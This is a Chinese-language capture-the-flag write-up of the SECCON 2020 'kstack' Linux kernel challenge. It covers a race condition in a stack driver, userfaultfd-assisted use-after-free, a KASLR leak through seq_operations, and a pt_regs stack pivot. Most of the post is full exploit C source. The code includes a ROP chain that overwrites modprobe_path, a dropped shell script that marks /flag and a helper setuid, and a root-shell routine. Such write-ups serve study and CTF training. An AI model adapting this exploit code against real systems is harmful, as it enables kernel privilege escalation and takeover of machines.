# seccon-2020-kstack



### 总结

这题有点迷，按照我的理解，开启了`kpti`并不会影响将内核栈迁移到用户态空间并调用内核态函数，实际上我栈迁移之后调用函数会莫名其妙的挂死。后来搜索了一下错误，发现和`kvm`有关系，索性不使用`kvm`，改了下启动选项为`qemu64,+smep`。

- 开启`KPTI`之后哪怕关掉了`smap/smep`，由于页表不同，仍然无法调用用户态的函数

- 可以使用`swapgs_restore_regs_and_return_to_usermode `这个函数切换页表，并完美返回用户态；或者引发段错误，并为`SIGSEGV`信号注册`get_shell`函数，仍然可以获取到`root`权限的`shell`

- 如果能`rop`的话，不一定非得要`root shell`，直接修改`modprobe_path`或者`core_pattern`即可

<!-- more -->

### 题目分析

这里是[题目链接](https://github.com/BrieflyX/ctf-pwns/tree/master/kernel/kstack)，提供了源码及题目附件。

启动脚本：

```shell
#!/bin/sh
qemu-system-x86_64 \
    -m 512M \
    -kernel ./bzImage \
    -initrd ./rootfs.cpio \
    -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet" \
    -cpu kvm64,+smep \
    -net user -net nic -device e1000 \
    -monitor /dev/null \
    -nographic
```

开启了`kaslr/smep`，然后启动后查看`/proc/cpuinfo`，发现默认开启了`kpti`：

![image-20220428214212590](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220428214212590.png)



然后分析一下题目。

发现实现了一个栈操作，但是`push`的时候，首先对`head`赋值了，然后赋值出现错误才恢复`head`，因此可以造成条件竞争。

![image-20220428214458158](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220428214458158.png)





### 利用思路

由于分配的是`kmalloc-32`，并且只能写`8`字节，所以考虑劫持`seq_operations`结构体，该结构体的`start`函数指针可以通过以下方式触发：

```c
int fd = open("/proc/self/stat", 0);
read(fd, buffer, 0);
```

此外，通过`userfaultfd`机制，大大提高利用成功的机率。利用步骤分为两步：

1、泄露`kernel`基地址

首先分配一定数量的`seq_operations`结构体，然后都释放掉。这样，除了前`8`个字节，其余的函数指针并不会被清空。然后，与`kstack`驱动交互，插入一个`node`，在拷贝用户态的数据的时候卡住，并在`userfaultfd`处理线程中将其释放掉，这样就读取了`8`字节的脏数据，多次尝试后发现该地址与`kernel base`的偏移是固定的，因此可以泄露出内核的基地址。

2、劫持`seq_operations`结构体的`start`函数指针

首先`push`一个`node`，然后`pop node`，并在`pop`的时候卡住，在`userfaultfd`线程中先执行`1`次`open("/proc/self/stat", 0)`进行占位，然后再次`pop node`，这样操作之后即可构造`UAF`修改函数指针。然后，利用`setxattr`将这个`chunk`占住，并篡改前8个字节，然后在`userfaultfd`中调用`read(fd, buf, 0)`触发`start`函数指针。利用`pt_regs`结构体进行栈迁移，将栈迁移到用户态后，利用`rop`修改`modprobe_path`变量，指向用户定义的一个`shell`脚本，然后执行一个非法格式的`elf`文件即可触发脚本调用。

### EXP

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <poll.h>
#include <assert.h>
#include <syscall.h>
#include <pthread.h>
#include <linux/fs.h>
#include <linux/fuse.h>
#include <linux/sched.h>
#include <linux/if_ether.h>
#include <linux/userfaultfd.h>
#include <sys/shm.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <ctype.h>

// data
size_t g_user_cs, g_user_ss, g_user_sp, g_user_eflags;
size_t g_prepare_kernel_cred_addr, g_commit_creds_addr;
size_t g_vmlinux_base_addr;
size_t *g_buffer;
size_t g_r15, g_r14, g_r13, g_r12, g_rbp, g_rbx, g_r11, g_r10, g_r9, g_r8, g_rdx, g_rcx, g_rax, g_rsi, g_rdi;
ssize_t g_process_userfault_running;

#define G_BUFFER_SIZE 0x100000
#define PAGE_SIZE 0x1000

/*
extern size_t g_user_cs, g_user_ss, g_user_sp, g_user_eflags;
extern size_t g_prepare_kernel_cred_addr, g_commit_creds_addr;
extern size_t g_vmlinux_base_addr;
extern size_t *g_buffer;
extern size_t g_r15, g_r14, g_r13, g_r12, g_rbp, g_rbx, g_r11, g_r10, g_r9, g_r8, g_rdx, g_rcx, g_rax, g_rsi, g_rdi;
extern ssize_t g_process_userfault_running;
*/

#define RAW_VMLINUX_BASE_ADDR 0xffffffff81000000
#define GADGETS_OFFSET (g_vmlinux_base_addr - RAW_VMLINUX_BASE_ADDR)

#define GET_GADGET_REAL_ADDR(x) (x + GADGETS_OFFSET)

void __attribute__((constructor)) initial()
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    g_buffer = (size_t *)calloc(G_BUFFER_SIZE, 1);
}

void __attribute__((destructor)) finish()
{
    free(g_buffer);
}

void clear_buffer()
{
    if (g_buffer)
    {
        memset(g_buffer, G_BUFFER_SIZE, 0);
    }
}

void info(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;33m*\033[0m] \033[40;33mINFO\033[0m ===> %s\r\n", s);
}

void success(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;32m+\033[0m] \033[40;32mOJBK\033[0m ===> %s\r\n", s);
}

void fail(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;31m-\033[0m] \033[40;31mFAIL\033[0m ===> %s\r\n", s);
}

void warn(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;34m#\033[0m] \033[40;34mWARN\033[0m ===> %s\r\n", s);
}

void error(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;31m!\033[0m] \033[40;31mERROR\033[0m ===> %s\r\n", s);
    exit(-1);
}

void get_shell()
{
    if (getuid() == 0)
    {
        success("Get root shell!!!");
    }
    else
    {
        warn("Get normal shell...");
    }
    system("/bin/sh");
}

void get_shell_si()
{
    system("/bin/sh");
}

static size_t get_shell_ex_flag = 0;
void get_shell_ex()
{
    if (get_shell_ex_flag)
    {
        return;
    }

    if (getuid() == 0)
    {
        success("Get root shell!!!");
        get_shell_ex_flag = 1;
    }
    else
    {
        warn("Get normal shell...");
    }
    system("/bin/sh");
}

// at&t flavor assembly
void save_status()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(g_user_cs), "=r"(g_user_ss), "=r"(g_user_eflags), "=r"(g_user_sp)
        :
        : "memory");
}

void set_root_uid()
{
    if (!g_prepare_kernel_cred_addr || !g_commit_creds_addr)
    {
        error("set prepare_kernel_cred_addr and commit_creds_addr first!");
    }
    char *(*pkc)(int) = g_prepare_kernel_cred_addr;
    void (*cc)(char *) = g_commit_creds_addr;
    (*cc)((*pkc)(0));
}

void *get_mmap_rwx(size_t addr, size_t len)
{
    return mmap((void *)addr, len, 7, 0x22, -1, 0);
}

void show_addr_u64(void *addr, size_t size)
{
    if (size < 8)
    {
        error("size is too small, must be 8 at least!");
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
    size = (size / 8) * 8;
    char *s = (char *)addr;
    for (; s < ((char *)addr) + size; s += 8)
    {
        printf("0x%016lx: 0x%016lx", (size_t)s, *(size_t *)s);
        s += 8;
        if (s < ((char *)addr) + size)
        {
            printf("\t0x%016lx\r\n", *(size_t *)s);
        }
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
}

void show_addr_u32(void *addr, size_t size)
{
    if (size < 4)
    {
        error("size is too small, must be 4 at least!");
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
    size = (size / 4) * 4;
    char *s = (char *)addr;
    for (; s < ((char *)addr) + size; s += 4)
    {
        printf("0x%08lx: 0x%08lx", (size_t)s, *(uint32_t *)s);
        s += 4;
        if (s < ((char *)addr) + size)
        {
            printf("\t0x%08lx\r\n", *(uint32_t *)s);
        }
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
}

void hexdump(void *addr, size_t len)
{

    len &= ~0xf;
    char buf[0x400];
    int printf_len;
    char *tmp;
    for (size_t i = 0; i < len / 0x10; i++)
    {
        memset(buf, 0, 0x400);
        printf_len = 0;

        tmp = (char *)addr + i * 0x10;
        printf_len = sprintf(&buf[printf_len], "+%04x %p: ", i * 0x10, tmp);
        for (size_t j = 0; j < 0x10; j++)
        {
            printf_len += sprintf(&buf[printf_len], "%02x ", (uint8_t)tmp[j]);
        }

        printf_len += sprintf(&buf[printf_len], "| ");
        for (size_t j = 0; j < 0x10; j++)
        {
            char _c = tmp[j];
            if (!isprint(_c))
            {
                _c = '.';
            }
            printf_len += sprintf(&buf[printf_len], "%c", _c);
        }

        puts(buf);
    }
}

void flat(size_t data[], const size_t data_len, size_t *target_addr, size_t *cur_idx)
{
    for (size_t i = 0; i < data_len; i++)
    {
        target_addr[*cur_idx] = data[i];
        ++(*cur_idx);
    }
}

//=====================================userfaultfd======================
struct UserfaultHandlerArg
{
    size_t uffd;
    void (*func)(void *, void *);
    void *func_args;
};

void register_userfault(void *fault_page, void *handler, void (*func)(void *, void *), void *func_args)
{
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    size_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        error("register_userfault: ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page; //我们要监视的区域
    ur.range.len = PAGE_SIZE;
    ur.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) //注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作
        error("register_userfault: ioctl-UFFDIO_REGISTER");
    //开一个线程，接收错误的信号，然后处理
    struct UserfaultHandlerArg *args = malloc(sizeof(struct UserfaultHandlerArg));
    args->uffd = uffd;
    args->func = func;
    args->func_args = func_args;
    int s = pthread_create(&thr, NULL, handler, (void *)args);
    if (s != 0)
        error("register_userfault: pthread_create");
}

void *userfaultfd_stuck_handler(void *arg)
{
    struct UserfaultHandlerArg *args = (struct ActualArgs *)arg;

    struct uffd_msg msg;
    size_t uffd = args->uffd;
    int nready;
    struct pollfd pollfd;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    info("userfaultfd_stuck_handler: start to process userfault");
    if (nready != 1)
    {
        error("userfaultfd_stuck_handler: wrong poll return val");
    }
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0)
    {
        error("userfaultfd_stuck_handler: msg err");
    }

    char *page = (char *)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        error("userfaultfd_stuck_handler: mmap err");
    }
    struct uffdio_copy uc;
    // init page
    memset(page, 0, sizeof(page));
    // wait for handler
    while (!g_process_userfault_running)
    {
        sleep(1);
        info("wait...process_userfault_running is not ok!");
    }
    // handler
    if (args->func)
    {
        args->func(page, args->func_args);
    }
    else
    { // copy
        memcpy(page, args->func_args, PAGE_SIZE);
    }

    uc.src = (unsigned long)page;
    uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);
    info("userfaultfd_stuck_handler: stuck handler done");
    g_process_userfault_running = 0;
    return NULL;
}

void seq_operation_spray(ssize_t *seq_fds, size_t count)
{
    int seq;
    for (size_t i = 0; i < count; i++)
    {
        if ((seq = open("/proc/self/stat", O_RDONLY)) == -1)
        {
            error("seq_operation_spray error!");
        }
        seq_fds[i] = seq;
    }
}

void seq_fds_close(ssize_t *seq_fds, size_t count)
{
    for (size_t i = 0; i < count; i++)
    {
        if (seq_fds[i] > 2) {
            close(seq_fds[i]);
            seq_fds[i] = -1;
        }
    }
}


size_t self_copy(uint8_t c)
{
    size_t res = 0;
    for (size_t i = 0; i < sizeof(size_t); i++)
    {
        res <<= 8;
        res |= c;
    }
    return res;
}

void assign_all_regs()
{
    // in program
    /*
    rax
    rdx
    rcx
    rsi
    rdi
    r8
    r9
    r10
    r11
    rbx
    r12
    g_r15 = 0x6161616161616161;
    g_r14 = 0x6262626262626262;
    g_r13 = 0x6363636363636363;
    g_r12 = 0x6464646464646464;
    g_r11 = 0x6565656565656565;
    g_r10 = 0x6666666666666666;
    g_r9  = 0x6767676767676767;
    g_r8  = 0x6868686868686868;
    g_rbp = 0x6969696969696969;
    g_rbx = 0x6a6a6a6a6a6a6a6a;
    g_rdx = 0x6b6b6b6b6b6b6b6b;
    g_rcx = 0x6c6c6c6c6c6c6c6c;
    g_rax = 0x6d6d6d6d6d6d6d6d;
    g_rsi = 0x6e6e6e6e6e6e6e6e;
    g_rdi = 0x6f6f6f6f6f6f6f6f;
    */
    g_r15 = self_copy('a'); // 0x61
    g_r14 = self_copy('b'); // 0x62
    g_r13 = self_copy('c'); // 0x63
    g_r12 = self_copy('d'); // 0x64
    g_r11 = self_copy('e'); // 0x65
    g_r10 = self_copy('f'); // 0x66
    g_r9  = self_copy('g'); // 0x67
    g_r8  = self_copy('h'); // 0x68
    g_rbp = self_copy('i'); // 0x69
    g_rbx = self_copy('j'); // 0x6a
    g_rdx = self_copy('k'); // 0x6b
    g_rcx = self_copy('l'); // 0x6c
    g_rax = self_copy('m'); // 0x6d
    g_rsi = self_copy('n'); // 0x6e
    g_rdi = self_copy('f'); // 0x6f
}

void prepare_for_modprobe_path(const char *modprobe_path, const char* suid_path)
{
    if (suid_path == NULL) {
        suid_path = "/tmp/rootme";
    }
	system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    char buf[0x400] = {0};
    sprintf(buf, "echo '#!/bin/sh\nchmod 4777 /flag\nchmod 4777 %s\n' > %s", suid_path, modprobe_path);
	system(buf);
    sprintf(buf, "chmod +x %s", modprobe_path);
	system(buf);
	system("chmod +x /tmp/dummy");
}
```



```c
#include "../helpful.h"
#include <sys/xattr.h>

extern size_t g_user_cs, g_user_ss, g_user_sp, g_user_eflags;
extern size_t g_prepare_kernel_cred_addr, g_commit_creds_addr;
extern size_t g_vmlinux_base_addr;
extern size_t *g_buffer;
extern size_t g_r15, g_r14, g_r13, g_r12, g_rbp, g_rbx, g_r11, g_r10, g_r9, g_r8, g_rdx, g_rcx, g_rax, g_rsi, g_rdi;
extern ssize_t g_process_userfault_running;

#define DEV_NAME "/proc/stack"

int g_stack_fd;
int g_seqs[0x100];


void push(int fd, void *data)
{
    info("start push node...");
    int res = ioctl(fd, 0x57ac0001, data);
    if (res < 0) {
        error("push error");
    }
    success("push node success!");
}

void pop(int fd, void *data)
{
    info("start pop node...");
    int res = ioctl(fd, 0x57ac0002, data);
    if (res < 0) {
        error("pop error");
    }
    success("pop node success!");
}


void open_stack()
{
    g_stack_fd = open(DEV_NAME, O_RDWR);
    if (g_stack_fd < 0){
        error("open /proc/stack error!");
    }
}

void prepare_seq()
{
    ssize_t seqs1[0x100] = {0};
    seq_operation_spray(seqs1, 0x10);
    seq_operation_spray(g_seqs, 0x10);
    seq_fds_close(seqs1, 0x10);
}

void stuck_func1(void *args)
{
    pop(g_stack_fd, g_buffer);
    hexdump(g_buffer, 0x10);
}

void leak_addr()
{
    void* stuck_map = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    register_userfault(stuck_map, &userfaultfd_stuck_handler, &stuck_func1, NULL);
    g_process_userfault_running = 1;
    prepare_seq();
    push(g_stack_fd, stuck_map);
    g_vmlinux_base_addr = *g_buffer - 0x13be80;
    info("leak kernel base addr: 0x%lx", g_vmlinux_base_addr);
}

void stuck_func2(void *args)
{
    char data[0x10] = {0};
    int seq;
    pop(g_stack_fd, data);
    seq_operation_spray(&seq, 1);
    g_rdi = seq;
    info("used seq fd: %d", seq);
}

void stuck_func3(void *args)
{
    // read(g_seqs[0xff], g_buffer, 0);
    seq_fds_close(g_seqs, 0x10);
    asm volatile (
        "movq %0, %%r15\n\t"
        "movq %1, %%r14\n\t"
        "movq %2, %%rbp\n\t"
        "movq %3, %%rcx\n\t"
        "movq %4, %%rdi\n\t"
        "movq %5, %%r8\n\t"
        "movq %6, %%r9\n\t"
        "movq %7, %%r10\n\t"
        "movq %8, %%r11\n\t"
        "movq %9, %%rbx\n\t"
        "movq %10, %%r12\n\t"
        "movq %11, %%r13\n\t"
        "movq %%rsp, %%rsi\n\t"
        "xor %%rdx, %%rdx\n\t"
        "xor %%rax, %%rax\n\t"
        "syscall\n\t"
        :
        :"r"(g_r15), "r"(g_r14), "r"(g_rbp),"r"(g_rcx),"r"(g_rdi),"r"(g_r8), "r"(g_r9), "r"(g_r10), "r"(g_r11), "r"(g_rbx), "r"(g_r12), "r"(g_r13)
        :
    );
}

void write_seq_start()
{
    push(g_stack_fd, "deadbeef");
    sleep(2);

    g_process_userfault_running = 1;
    void* stuck_map1 = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    register_userfault(stuck_map1, &userfaultfd_stuck_handler, &stuck_func2, NULL);

    void* normal_map = mmap(0xdead0000, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    void* stuck_map2 = mmap(0xdead0000 + PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    register_userfault(stuck_map2, &userfaultfd_stuck_handler, &stuck_func3, NULL);
    info("stuck3 addr: %p", &stuck_func3);

    // prepare data
    size_t gadget = 0xffffffff812bfb7e + GADGETS_OFFSET;
    memcpy((char *)normal_map + PAGE_SIZE - 8, &gadget, 8);

    g_r15 = 0x6161616161616161;
    g_r14 = 0x6262626262626262;
    g_r13 = 0x6363636363636363;
    g_r12 = 0x6464646464646464;
    g_r11 = 0x6565656565656565;
    g_r10 = 0x6666666666666666;
    g_r9  = 0x6767676767676767;
    g_r8  = 0x6868686868686868;
    g_rbp = 0x6969696969696969;
    g_rbx = 0x6a6a6a6a6a6a6a6a;
    g_rdx = 0x6b6b6b6b6b6b6b6b;
    g_rcx = 0x6c6c6c6c6c6c6c6c;
    g_rax = 0x6d6d6d6d6d6d6d6d;
    g_rsi = 0x6e6e6e6e6e6e6e6e;
    g_rdi = 0x6f6f6f6f6f6f6f6f;

    // 0xffffffff81589318: push rsp; pop rbp; ret;
    // 0xffffffff810bb573: pop rsp; ret;
    // 0xffffffff81034505: pop rdi; ret;
    // 0xffffffff810a6a54: mov qword ptr [rdi], rax; ret; 0x68632f706d742f
    // 0xffffffff810202b1: pop rax; ret; 
    // 0xFFFFFFFF81C2C540 /sbin/modprobe

    size_t pop_rdi_ret = GET_GADGET_REAL_ADDR(0xffffffff81034505);
    g_commit_creds_addr = GET_GADGET_REAL_ADDR(0xffffffff81069c10);
    g_prepare_kernel_cred_addr = GET_GADGET_REAL_ADDR(0xffffffff81069e00);

    g_rbp = (size_t)g_buffer;
    g_r12 = 0xffffffff8122dc50 + GADGETS_OFFSET; // 
    g_rbx = 0xffffffff8109e950 + GADGETS_OFFSET; // 0xffffffff8109e950: jmp rbx; 
    g_r10 = 0xffffffff81589318 + GADGETS_OFFSET; 
    g_r9  = 0xffffffff810bb573 + GADGETS_OFFSET;
    g_r8  = (size_t)g_buffer + 0x10000;

    g_buffer = (size_t)g_buffer + 0x10000;
    int i = 0;
    g_buffer[i++] = pop_rdi_ret;
    g_buffer[i++] = GET_GADGET_REAL_ADDR(0xFFFFFFFF81C2C540);
    g_buffer[i++] = GET_GADGET_REAL_ADDR(0xffffffff810202b1); // pop rax
    g_buffer[i++] = 0x68632f706d742f; // /tmp/ch
    g_buffer[i++] = GET_GADGET_REAL_ADDR(0xffffffff810a6a54); // mov
    g_buffer[i++] = GET_GADGET_REAL_ADDR(0xFFFFFFFF81600116);
    g_buffer[i++] = 0;
    g_buffer[i++] = 0;
    g_buffer[i++] = 0;
    g_buffer[i++] = (size_t)&get_shell;
    g_buffer[i++] = g_user_cs;
    g_buffer[i++] = g_user_eflags;
    g_buffer[i++] = g_user_sp;
    g_buffer[i++] = g_user_ss;


    // stuck
    pop(g_stack_fd, stuck_map1);
    g_process_userfault_running = 1;
    setxattr("/exp", "roderick", normal_map + PAGE_SIZE - 8, 0x20, 0);
}

void main()
{
    prepare_for_modprobe_path("/tmp/ch", NULL);
    save_status();
    open_stack();
    leak_addr();
    write_seq_start();
    
}
```

![image-20220428215759043](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220428215759043.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2022-04-28-seccon-2020-kstack/  

